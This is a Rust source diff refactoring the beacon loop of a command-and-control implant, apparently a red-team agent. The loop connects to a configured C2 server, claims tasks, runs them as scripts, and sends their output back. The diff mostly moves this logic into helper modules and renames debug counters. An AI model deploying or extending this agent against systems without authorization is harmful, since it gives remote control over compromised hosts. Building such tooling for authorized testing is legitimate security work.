@@ -1,114 +1,51 @@
-use anyhow::{Context, Error, Result};
+use anyhow::Result;
 use c2::pb::c2_client::C2Client;
-use c2::pb::{Agent, Beacon, ClaimTasksRequest, Host, Task, TaskOutput};
+use c2::pb::TaskOutput;
 
 use chrono::Utc;
 use clap::{arg, Command};
-use eldritch::{eldritch_run, EldritchPrintHandler};
 use imix::exec::{handle_output_and_responses, AsyncTask};
 use imix::init::agent_init;
+use imix::tasks::start_new_tasks;
+use imix::{tasks, Config};
 use std::collections::HashMap;
 use std::fs::File;
-use std::sync::mpsc::{channel, Sender};
-use std::thread;
 use std::time::Instant;
-use tokio::task;
-use tokio::time::Duration;
 
-async fn handle_exec_tome(
-    task: Task,
-    print_channel_sender: Sender<String>,
-) -> Result<(String, String)> {
-    // TODO: Download auxillary files from CDN
-
-    // Read a tome script
-    // let task_quest = match task.quest {
-    //     Some(quest) => quest,
-    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
-    // };
-
-    let print_handler = EldritchPrintHandler {
-        sender: print_channel_sender,
-    };
-
-    // Execute a tome script
-    let res = match thread::spawn(move || {
-        eldritch_run(
-            task.id.to_string(),
-            task.eldritch.clone(),
-            Some(task.parameters.clone()),
-            &print_handler,
-        )
-    })
-    .join()
-    {
-        Ok(local_thread_res) => local_thread_res,
-        Err(_) => todo!(),
-    };
-    match res {
-        Ok(tome_output) => Ok((tome_output, "".to_string())),
-        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
-    }
-}
-
-async fn handle_exec_timeout_and_response(
-    task: Task,
-    print_channel_sender: Sender<String>,
-) -> Result<(), Error> {
-    // Tasks will be forcebly stopped after 1 week.
-    let timeout_duration = Duration::from_secs(60 * 60 * 24 * 7); // 1 Week.
-
-    // Define a future for our execution task
-    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());
-    // Execute that future with a timeout defined by the timeout argument.
-    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
-        Ok(res) => match res {
-            Ok(tome_result) => tome_result,
-            Err(tome_error) => ("".to_string(), tome_error.to_string()),
-        },
-        Err(timer_elapsed) => (
-            "".to_string(),
-            format!(
-                "Time elapsed task {} has been running for {} seconds",
-                task.id,
-                timer_elapsed.to_string()
-            ),
-        ),
-    };
-
-    print_channel_sender
-        .clone()
-        .send(format!("---[RESULT]----\n{}\n---------", tome_result.0))?;
-    print_channel_sender
-        .clone()
-        .send(format!("---[ERROR]----\n{}\n--------", tome_result.1))?;
-    Ok(())
+fn get_callback_uri(imix_config: Config) -> Result<String> {
+    Ok(imix_config.callback_config.c2_configs[0].uri.clone())
 }
 
 // Async handler for port scanning.
 async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
-    let mut loop_count: i32 = 0;
-    let config_file = File::open(config_path)?;
-    let imix_config: imix::Config = serde_json::from_reader(config_file)?;
+    #[cfg(debug_assertions)]
+    let mut debug_loop_count: i32 = 0;
 
     // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
-    let mut all_exec_futures: HashMap<i64, AsyncTask> = HashMap::new();
+    // AKA Work queue
+    let mut all_exec_futures: HashMap<i32, AsyncTask> = HashMap::new();
     // This hashmap tracks all tasks output
-    let mut all_task_res_map: HashMap<i64, Vec<TaskOutput>> = HashMap::new();
+    // AKA Results queue
+    let mut all_task_res_map: HashMap<i32, Vec<TaskOutput>> = HashMap::new();
 
-    let agent_properties = agent_init()?;
+    let (agent_properties, imix_config) = agent_init(config_path)?;
 
     loop {
-        let start_time = Utc::now().time();
+        // @TODO: Why two timers?
+        let debug_start_time = Utc::now().time();
+
         // 0. Get loop start time
         let loop_start_time = Instant::now();
+
         #[cfg(debug_assertions)]
         println!("Get new tasks");
+
         // 1. Pull down new tasks
         // 1a) calculate callback uri
-        let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
+        let cur_callback_uri = get_callback_uri(imix_config.clone())?;
 
-        let mut tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
+        // 1b) Setup the tavern client
+        let tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
             Ok(tavern_client_local) => tavern_client_local,
             Err(err) => {
                 #[cfg(debug_assertions)]
@@ -117,93 +54,33 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
             }
         };
 
+        // 1c) Collect new tasks
         #[cfg(debug_assertions)]
         println!(
             "[{}]: collecting tasks",
-            (Utc::now().time() - start_time).num_milliseconds()
+            (Utc::now().time() - debug_start_time).num_milliseconds()
         );
-        // 1b) Collect new tasks
-        let req = tonic::Request::new(ClaimTasksRequest {
-            beacon: Some(Beacon {
-                identifier: agent_properties.beacon_id.clone(),
-                principal: agent_properties.principal.clone(),
-                host: Some(Host {
-                    identifier: agent_properties.host_id.clone(),
-                    name: agent_properties.hostname.clone(),
-                    platform: agent_properties.host_platform.try_into()?,
-                    primary_ip: agent_properties
-                        .primary_ip
-                        .clone()
-                        .context("primary ip not found")?,
-                }),
-                agent: Some(Agent {
-                    identifier: agent_properties.agent_id.clone(),
-                }),
-                interval: imix_config.callback_config.interval,
-            }),
-        });
-        let new_tasks = match tavern_client.claim_tasks(req).await {
-            Ok(resp) => resp.get_ref().tasks.clone(),
-            Err(error) => {
-                #[cfg(debug_assertions)]
-                println!("main_loop: error claiming task\n{:?}", error);
-                let empty_vec = vec![];
-                empty_vec
-            }
-        };
 
+        let new_tasks = tasks::get_new_tasks(
+            agent_properties.clone(),
+            imix_config.clone(),
+            tavern_client.clone(),
+        )
+        .await?;
+
+        // 2. Start new tasks
         #[cfg(debug_assertions)]
         println!(
             "[{}]: Starting {} new tasks",
-            (Utc::now().time() - start_time).num_milliseconds(),
+            (Utc::now().time() - debug_start_time).num_milliseconds(),
             new_tasks.len()
         );
-        // 2. Start new tasks
-        for task in new_tasks {
-            #[cfg(debug_assertions)]
-            println!("Parameters:\n{:?}", task.clone().parameters);
-            #[cfg(debug_assertions)]
-            println!("Launching:\n{:?}", task.clone().eldritch);
 
-            let (sender, receiver) = channel::<String>();
-            let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
-
-            #[cfg(debug_assertions)]
-            println!(
-                "[{}]: Queueing task {}",
-                (Utc::now().time() - start_time).num_milliseconds(),
-                task.clone().id
-            );
-
-            match all_exec_futures.insert(
-                task.clone().id,
-                AsyncTask {
-                    future_join_handle: task::spawn(exec_with_timeout),
-                    start_time: Utc::now(),
-                    grpc_task: task.clone(),
-                    print_reciever: receiver,
-                },
-            ) {
-                Some(_old_task) => {
-                    #[cfg(debug_assertions)]
-                    println!("main_loop: error adding new task. Non-unique taskID\n");
-                }
-                None => {
-                    #[cfg(debug_assertions)]
-                    println!("main_loop: Task queued successfully\n");
-                } // Task queued successfully
-            }
-
-            #[cfg(debug_assertions)]
-            println!(
-                "[{}]: Queued task {}",
-                (Utc::now().time() - start_time).num_milliseconds(),
-                task.clone().id
-            );
-        }
+        start_new_tasks(new_tasks, all_exec_futures, debug_start_time).await?;
 
         // 3. Sleep till callback time
         let time_to_sleep = imix_config
+            .clone()
             .callback_config
             .interval
             .checked_sub(loop_start_time.elapsed().as_secs())
@@ -212,23 +89,24 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         #[cfg(debug_assertions)]
         println!(
             "[{}]: Sleeping seconds {}",
-            (Utc::now().time() - start_time).num_milliseconds(),
+            (Utc::now().time() - debug_start_time).num_milliseconds(),
             time_to_sleep
         );
-        // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
+
         std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.
 
+        // Check status & send response
         #[cfg(debug_assertions)]
         println!(
             "[{}]: Checking task status",
-            (Utc::now().time() - start_time).num_milliseconds()
+            (Utc::now().time() - debug_start_time).num_milliseconds()
         );
 
-        // Check status & send response
+        let all_exec_futures_iter = all_exec_futures.into_iter();
         let res = handle_output_and_responses(
-            start_time,
+            debug_start_time,
             tavern_client,
-            all_exec_futures.into_iter(),
+            all_exec_futures_iter,
             all_task_res_map.clone(),
         )
         .await?;
@@ -240,8 +118,8 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         // Debug loop tracker
         #[cfg(debug_assertions)]
         if let Some(count_max) = loop_count_max {
-            loop_count += 1;
-            if loop_count >= count_max {
+            debug_loop_count += 1;
+            if debug_loop_count >= count_max {
                 return Ok(());
             }
         }
@@ -298,10 +176,8 @@ mod tests {
     use super::*;
     use c2::pb::ClaimTasksResponse;
 
-    // #[test]
-    // fn imix_handle_exec_tome() {
-    //     let server_response = tonic::Response::new(ClaimTasksResponse { tasks: todo!() });
-    // }
+    #[test]
+    fn imix_handle_exec_tome() {}
 
     //     #[test]
     //     fn imix_handle_exec_tome() {
